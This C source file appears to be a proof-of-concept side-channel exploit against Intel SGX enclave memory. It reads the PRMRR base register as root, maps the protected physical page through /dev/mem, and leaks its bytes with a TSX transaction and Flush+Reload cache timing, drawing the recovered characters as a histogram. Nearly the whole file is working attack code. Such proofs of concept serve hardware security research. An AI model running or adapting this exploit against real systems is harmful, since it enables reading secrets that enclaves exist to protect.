#define _GNU_SOURCE 1

#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>

#include "cacheutils.h"

#define ACCESS_MAPPING          1
#define FLUSH_MAPPING           0
#define FROM                    'A'
#define TO                      'Z'

#define MSR_PRMRR_PHYS_BASE     0x1F4
#define PRMRR_BASE_MASK         0x3FFFFFFFF000
#define PRMRR_MEMTYPE_MASK      0x7

char __attribute__((aligned(4096))) mem[256 * 4096];
size_t hist[256];

/* NOTE: requires root and `sudo modprobe msr` */
int rdmsr_prm_base(uint64_t *prm)
{
    int fd, ret;
    if ((fd = open("/dev/cpu/0/msr", O_RDONLY)) < 0) return -1;

    ret = pread(fd, prm, sizeof(prm), MSR_PRMRR_PHYS_BASE);
    close(fd);
    return ret;
}

/* NOTE: requires root and `sudo insmod module/devmem_mod.ko` */
char *remap_physical(uint64_t target)
{
  int fd_mem = open("/dev/mem", O_RDWR);
  if (fd_mem < 0)
    return NULL;

  char* mapping = (char*)mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd_mem, target);
  if (mapping == MAP_FAILED)
    return NULL;

  close(fd_mem);
  return mapping;
}

void recover(void);

int main(int argc, char *argv[])
{
  /* Initialize and flush LUT */
  memset(mem, 0, sizeof(mem));
  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }

  /* Get SGX PRM memory physical address */
  uint64_t prmrr = 0x0;
  if (rdmsr_prm_base(&prmrr) < 0)
  {
      printf("[!] Could not read MSR_PRMRR_PHYS_BASE! Did you load the `msr` driver and start as root on an SGX-enabled processor?\n");
      return -1;
  }
  uint64_t target = prmrr & PRMRR_BASE_MASK;
  printf("[+] Got SGX MSR_PRMRR_PHYS_BASE: %p (base=%p, memtype=%d)\n",
        (void*) prmrr, (void*) target, (int) prmrr & PRMRR_MEMTYPE_MASK);

  /* Create valid virtual mapping to PRM physical memory */
  char *mapping = NULL;
  if (!(mapping = remap_physical(target)))
  {
      printf("[!] Failed to remap using /dev/mem! Did you load the `devmem_mod` driver and start as root?\n");
      return -1;
  }
  int rv = *mapping;
  printf("using mapping at %p (val=0x%02x)\n", mapping, rv);
  if (rv != -1)
  {
      printf("[!] Abort page semantics not applied?\n");
      return -1;
  }

  /* Calculate Flush+Reload threshold */
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zu\n", CACHE_MISS);

  while (true)
  {
    /* Flush mapping */
    #if ACCESS_MAPPING
        maccess(mapping);
    #endif
    #if FLUSH_MAPPING
        flush(mapping);
    #endif

    /* Begin transaction and recover value */
    if(xbegin() == (~0u)) {
      maccess(mem + 4096 * mapping[0]);
      xend();
    }
    
    recover();
  }

  return 0;
}

void recover(void) {
    /* Recover value from cache and update histogram */
    bool update = false;
    for (size_t i = FROM; i <= TO; i++) {
      if (flush_reload((char*) mem + 4096 * i)) {
        hist[i]++;
        update = true;
      }
    }

    /* Redraw histogram on update */
    if (update == true) {
        printf("\x1b[2J");

        int max = 1;
        for (int i = FROM; i <= TO; i++) {
          if (hist[i] > max) {
            max = hist[i];
          }
        }

        for (int i = FROM; i <= TO; i++) {
            printf("%c: (%4zu) ", i, hist[i]);
            for (int j = 0; j < hist[i] * 60 / max; j++) {
              printf("#");
            }
            printf("\n");
        }

        fflush(stdout);
    }
}
